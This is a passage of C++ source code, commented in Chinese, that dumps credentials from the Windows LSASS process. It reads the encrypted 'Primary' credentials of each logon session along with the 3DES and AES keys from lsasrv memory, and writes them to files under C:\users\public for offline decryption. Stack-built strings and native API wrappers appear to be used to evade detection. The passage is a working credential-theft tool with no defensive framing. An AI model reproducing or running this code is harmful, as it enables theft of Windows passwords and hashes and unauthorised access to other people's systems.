#ifdef DEBUG
            printf("_p_credential_addr addr: %p\n", _p_credential_addr);
#endif // DEBUG

            // 每一步读取内存都可能会失败，如果失败，就continue
            if (!NT_ReadProcessMemory(_lsass_handle, (void*)_p_credential_addr, (void*)stack_string, 8, &bytesRead))continue;

            // 将该指针重新解释为DWORD64并取值
            DWORD64 _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
            // _credential_addr是一个单链表的头地址，里面可能会有多个节点，每个节点都有一个packageID
            // 而我们只想要Primary，也就是packageid为3的那个节点，节点地址+8取出dword就是packageid
            // 如果取出的packageid不是3，我们就继续往后遍历
            while (1) {
                // 获取packageID
                SecureZeroMemory(stack_string, 50);
                if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr + 8), (void*)stack_string, 8, &bytesRead)) {
                    break; continue;
                }
                DWORD _package_id = *(reinterpret_cast<DWORD*>(stack_string));
                if (3 == _package_id) {
                    // 命中我们的目标节点
                    // 此时_credential_addr就是正确的节点的地址，我们这里直接break即可
                    break;
                }
                else {
                    // 往后遍历
                    SecureZeroMemory(stack_string, 50);
                    // 获取下一个节点的地址
                    if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr), (void*)stack_string, 8, &bytesRead)) {
                        break; continue;
                    }
                    _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
                    // 判断是否达到了尾部
                    if (0 == _credential_addr)break;
                }
            }


            // 这个地址是一个结构体，+0x10偏移量就是密文的地址
            SecureZeroMemory(stack_string, 50);
            bytesRead = 0;

#ifdef DEBUG
            printf("_credential_addr: %p\n", _credential_addr);
#endif // DEBUG


#ifdef DEBUG
            printf("_p_second_level_credential_addr: %p\n", _credential_addr + 0x10);
#endif // DEBUG

            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_credential_addr + 0x10), (void*)stack_string, 8, &bytesRead))continue;
            DWORD64 _second_level_credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));
            // 往后偏移0x10是密文地址，偏移0x1a取出一个word是密文长度
            SecureZeroMemory(stack_string, 50);
            bytesRead = 0;

#ifdef DEBUG
            printf("_second_level_credential_addr: %p\n", reinterpret_cast<void*>(_second_level_credential_addr));
#endif // DEBUG

            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_second_level_credential_addr + 0x1a), (void*)stack_string, 2, &bytesRead))continue;
            DWORD _cipher_length = *(reinterpret_cast<WORD*>(stack_string));


#ifdef DEBUG
            printf("_cipher_length: %d\n", _cipher_length);
#endif // DEBUG

            char* buffer = (char*)0;
            if (_cipher_length > 0x400) {
                char _temp_stack[0x500] = { 0 };
                buffer = _temp_stack;
            }
            else if (_cipher_length > 0x300) {
                char _temp_stack[0x400] = { 0 };
                buffer = _temp_stack;
            }
            else if (_cipher_length > 0x200) {
                char _temp_stack[0x300] = { 0 };
                buffer = _temp_stack;
            }
            else if (_cipher_length > 0x100) {
                char _temp_stack[0x200] = { 0 };
                buffer = _temp_stack;
            }
            else {
                char _temp_stack[0x100] = { 0 };
                buffer = _temp_stack;
            }
            bytesRead = 0;
            // 读取密文
            /*        内存样例
    00000294`7a4765e0 0000000000000000      unknown
    00000294`7a4765e8 0000000000080007      packageID
    00000294`7a4765f0 000002947a476608      primary字符串地址
    00000294`7a4765f8 0000000001b001a8      密文的maxlen和len
    00000294`7a476600 000002947a476610      密文地址
    00000294`7a476608 007972616d697250      primary     [从这里开始读取，offset: 0x28]
    00000294`7a476610 7742f497b51510ca      密文
    00000294`7a476618 49d4b3bd4c920307
            */
            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_second_level_credential_addr + 0x28)), (void*)buffer, _cipher_length, &bytesRead))continue;

            // 读取完成后，需要把读取出来的字节写入到文件中

            // 首先要写入长度
            SecureZeroMemory(stack_string, 50);
            stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'k'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
            hFile = NT_CreateFileA(
                stack_string,                   // File path
                FILE_APPEND_DATA,              // Access mode (write)
                0,                          // Share mode (no sharing)
                NULL,                       // Security attributes (default)
                OPEN_ALWAYS,              // Creation disposition (always create a new file)
                FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
                NULL                        // Template file (not used)
            );

            if (hFile == INVALID_HANDLE_VALUE) {
                //fprintf(stderr, "Error creating/opening the file\n");
                return 1;
            }

            // Convert the WORD to a byte array
            BYTE byteArray[4];

            // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
            byteArray[0] = (BYTE)(_cipher_length & 0xFF);         // Low byte
            byteArray[1] = (BYTE)((_cipher_length >> 8) & 0xFF);  // High byte
            byteArray[2] = (BYTE)((_cipher_length >> 16) & 0xFF);  // High byte
            byteArray[3] = (BYTE)((_cipher_length >> 24) & 0xFF);  // High byte 

            // Write the byte array to the file
            DWORD bytesWritten;
            if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
                //fprintf(stderr, "Error writing to the file\n");
                NT_CloseHandle(hFile);
                return 1;
            }

            // 写入密文
            DWORD _out_para = 0;
            if (!NT_WriteFile(hFile, buffer, _cipher_length, &_out_para, NULL)) {
                //fprintf(stderr, "Error writing to the file\n");
                NT_CloseHandle(hFile);
                return 1;
            }

            // 关闭文件句柄
            NT_CloseHandle(hFile);
        }

        // 从_logon_session_list_ARRAY_addr取出8字节判断是否为0
        _DWORD64_logon_session_list_ARRAY_addr += 0x10;
        SecureZeroMemory(stack_string, 50);
        bytesRead = 0;
        NT_ReadProcessMemory(_lsass_handle, (void*)_DWORD64_logon_session_list_ARRAY_addr, (void*)stack_string, 8, &bytesRead);
        DWORD64 _next_link_list_addr = *(reinterpret_cast<DWORD64*>(stack_string));
        if (0 == _next_link_list_addr) {
            break;
        }
        _logon_session_list_addr = reinterpret_cast<char*>(_DWORD64_logon_session_list_ARRAY_addr);
    }

    // 之后需要获取3des和aes的key
    bytesRead = 0;
    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _3des_key_offset + 3), (void*)stack_string, 4, &bytesRead);
    _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);
    char* _1_3des_addr = lsasrv + _3des_key_offset + 7 + _offset_rip;
    // 取出该地址中的QWORD
    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)_1_3des_addr, (void*)stack_string, 8, &bytesRead);
    DWORD64 _2_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));
    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_2_3des_addr + 0x10)), (void*)stack_string, 8, &bytesRead);

    DWORD64 _3_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));
    // 读取长度
    SecureZeroMemory(stack_string, 50);
    // 对于windows7系列，有所不同，长度的位置是0x18而不是0x38
    // 因此我们把这里修改为一个变量，通过前面的计算进行赋值
    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + _3des_aes_len_offset)), (void*)stack_string, 4, &bytesRead);
    DWORD _3des_len = *(reinterpret_cast<DWORD*>(stack_string));


    SecureZeroMemory(stack_string, 50);
    // 写入文件
    // 3iaad
    stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = '3'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
    hFile = NT_CreateFileA(
        stack_string,                   // File path
        FILE_APPEND_DATA,              // Access mode (write)
        0,                          // Share mode (no sharing)
        NULL,                       // Security attributes (default)
        OPEN_ALWAYS,              // Creation disposition (always create a new file)
        FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
        NULL                        // Template file (not used)
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        //fprintf(stderr, "Error creating/opening the file\n");
        return 1;
    }

    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + _3des_aes_len_offset + 4)), (void*)stack_string, _3des_len, &bytesRead);

    BYTE byteArray[4];
    // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
    byteArray[0] = (BYTE)(_3des_len & 0xFF);         // Low byte
    byteArray[1] = (BYTE)((_3des_len >> 8) & 0xFF);  // High byte
    byteArray[2] = (BYTE)((_3des_len >> 16) & 0xFF);  // High byte
    byteArray[3] = (BYTE)((_3des_len >> 24) & 0xFF);  // High byte 

    // Write the byte array to the file
    DWORD bytesWritten;
    if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
        //   fprintf(stderr, "Error writing to the file\n");
        NT_CloseHandle(hFile);
        return 1;
    }

    // 写入密文
    DWORD _out_para = 0;
    if (!NT_WriteFile(hFile, stack_string, _3des_len, &_out_para, NULL)) {
        // fprintf(stderr, "Error writing to the file\n");
        NT_CloseHandle(hFile);
        return 1;
    }

    // 关闭文件句柄
    NT_CloseHandle(hFile);

    // 获取aes key
    // 和上面同样的操作，偏移量什么的都是一样的，只是offset改为_aes_key_offset
    bytesRead = 0;
    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _aes_key_offset + 3), (void*)stack_string, 4, &bytesRead);
    _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);
    char* _1_aes_addr = lsasrv + _aes_key_offset + 7 + _offset_rip;
    // 取出该地址中的QWORD
    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)_1_aes_addr, (void*)stack_string, 8, &bytesRead);
    DWORD64 _2_aes_addr = *(reinterpret_cast<DWORD64*>(stack_string));
    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_2_aes_addr + 0x10)), (void*)stack_string, 8, &bytesRead);

    DWORD64 _3_aes_addr = *(reinterpret_cast<DWORD64*>(stack_string));
    // 读取长度
    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + _3des_aes_len_offset)), (void*)stack_string, 4, &bytesRead);
    DWORD _aes_len = *(reinterpret_cast<DWORD*>(stack_string));



    SecureZeroMemory(stack_string, 50);
    // 写入文件
    // aiaad
    stack_string[0] = 'C'; stack_string[1] = ':'; stack_string[2] = '\\'; stack_string[3] = 'u'; stack_string[4] = 's'; stack_string[5] = 'e'; stack_string[6] = 'r'; stack_string[7] = 's'; stack_string[8] = '\\'; stack_string[9] = 'p'; stack_string[10] = 'u'; stack_string[11] = 'b'; stack_string[12] = 'l'; stack_string[13] = 'i'; stack_string[14] = 'c'; stack_string[15] = '\\'; stack_string[16] = 'a'; stack_string[17] = 'i'; stack_string[18] = 'a'; stack_string[19] = 'a'; stack_string[20] = 'd';
    hFile = NT_CreateFileA(
        stack_string,                   // File path
        FILE_APPEND_DATA,              // Access mode (write)
        0,                          // Share mode (no sharing)
        NULL,                       // Security attributes (default)
        OPEN_ALWAYS,              // Creation disposition (always create a new file)
        FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
        NULL                        // Template file (not used)
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        // fprintf(stderr, "Error creating/opening the file\n");
        return 1;
    }

    SecureZeroMemory(stack_string, 50);
    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + _3des_aes_len_offset + 4)), (void*)stack_string, _aes_len, &bytesRead);
    // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
    byteArray[0] = (BYTE)(_aes_len & 0xFF);         // Low byte
    byteArray[1] = (BYTE)((_aes_len >> 8) & 0xFF);  // High byte
    byteArray[2] = (BYTE)((_aes_len >> 16) & 0xFF);  // High byte
    byteArray[3] = (BYTE)((_aes_len >> 24) & 0xFF);  // High byte

    // Write the byte array to the file
    if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
        // fprintf(stderr, "Error writing to the file\n");
        NT_CloseHandle(hFile);
        return 1;
    }

    // 写入密文
    if (!NT_WriteFile(hFile, stack_string, _aes_len, &_out_para, NULL)) {
        // fprintf(stderr, "Error writing to the file\n");
        NT_CloseHandle(hFile);
        return 1;
    }

    // 关闭文件句柄
    NT_CloseHandle(hFile);

    return 0;
}
